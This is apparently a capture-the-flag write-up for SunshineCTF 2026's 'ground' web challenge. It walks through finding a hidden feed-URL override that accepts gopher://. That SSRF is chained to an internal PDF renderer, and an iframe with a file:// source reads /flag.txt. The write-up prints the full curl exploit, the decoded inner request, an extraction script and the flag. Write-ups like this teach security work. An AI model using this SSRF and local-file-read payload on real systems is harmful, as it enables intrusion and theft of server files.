---
title: "Ground"
description: "The \"ground\" web challenge (SunshineCTF 2026) is the Punxsutawney Orbital Weather Authority's Perpetual Forecast Console. A leftover operator comment in the page source hands out a…"
event: "sun"
category: "web"
categoryLabel: "Web"
tags: ["SunshineCTF 2026","web"]
date: "2026-10-22"
teammate: false
source: "sun/web/ground/writeup.md"
---

The "ground" web challenge (SunshineCTF 2026) is the Punxsutawney Orbital Weather Authority's Perpetual Forecast Console. A leftover operator comment in the page source hands out a hidden `feed=<url>` override parameter, and that override accepts gopher:// — a textbook SSRF with full protocol control. Chaining it to the site's own internal report renderer turns the flag into a rendered PDF we can download.

## Summary

The homepage HTML contains a commented-out maintenance form that re-enables the `feed` URL override, plus a second debug comment showing exactly which feed URL the server last fetched. By POSTing `feed=gopher://127.0.0.1:8000/...` with a crafted HTTP request, we make the (gopher-speaking) backend perform an arbitrary internal POST to `http://127.0.0.1:8000/report`, whose response embeds a PDF rendering of the submitted content. That PDF is returned in the page JSON as a base64 `data` field; `extract_pdf.py` decodes it to `report.pdf`, where the recovered flag lives.

## Recon

The static HTML is decorated with two operator artifacts. The first is the hidden override panel:

```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
     override it with feed=<url> when PUNX-1 is down and you need to point at
     a spare station. manual override panel below, re-enable it next outage.

<form class="override" action="/" method="post">
  <label for="feed">Station feed URL</label>
  <input id="feed" name="feed" type="text" size="60" value="http://127.0.0.1:8000/feed">
  <button type="submit">Load station</button>
</form>
-->
```

The second is the smoking gun: a debug comment reporting the *last* feed fetch, already in gopher form — meaning the parameter is not only unsanitized but deliberately gopher-capable:

```html
<!-- feed-debug: source=gopher://127.0.0.1:8000/_POST%20%2Freport%20...
```

## Exploit

The internal service on port 8000 exposes `/report`, which renders a PDF "shadow report" from form fields including `content`. Inside that PDF-rendering context an `<iframe src="file:///flag.txt">` makes the server embed the local flag file into the PDF body. Wrapped as a URL-encoded inner HTTP POST through gopher, the payload becomes a single curl:

```bash
curl -i -X POST 'https://odyssey.web.2026.sunshinectf.games/' --data-urlencode 'feed=gopher://127.0.0.1:8000/_POST%20%2Freport%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A8000%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AConnection%3A%20close%0D%0AContent-Length%3A%2062%0D%0A%0D%0Acontent%3D%3Ciframe%20src%3D%22file%3A%2F%2F%2Fflag.txt%22%3E%3C%2Fiframe%3E%26title%3DArchive'
```

Decoding that gopher URL by hand yields the transparent inner request:

```text
POST /report HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 62

content=<iframe src="file:///flag.txt"></iframe>&title=Archive
```

The response HTML comes back with a JSON blob containing a large `data` field: the base64-encoded rendered PDF. The `feed-debug` comment in that response echoes our payload with `bytes=14287`, confirming the internal 8000 service ate the whole request and returned the PDF.

## Extraction

`extract_pdf.py` is deliberately minimal:

```python
response = html.unescape(open("response.html", encoding="utf-8").read())
match = re.search(r'"data"\s*:\s*"([^"]+)"', response)
if not match:
    raise SystemExit("Could not find PDF data in response.html")
pdf_data = base64.b64decode(match.group(1))
open("report.pdf", "wb").write(pdf_data)
```

Note the `html.unescape` step — the server HTML-escapes the JSON, so the raw base64 in the file has entities that would corrupt `b64decode` without it. The regex narrowly pins the `"data"` JSON key and grabs the base64 body in one shot.

## Result

Opening `report.pdf` (a single-page PDF, version 1.4) shows the rendered "shadow report" containing the iframe's pulled-in contents. The extracted text survives in `report.txt` as:

```text
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
```

## Flag

```text
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
```

## Root Cause

Two independent mistakes compound here: a hidden URL-fetch override on a public endpoint allowing the gopher scheme (giving raw socket control over the port-8000 service), and an internal PDF generator that renders attacker content including `file://` references. Either alone is a bug; together they exfiltrate a local file across the SSRF boundary.
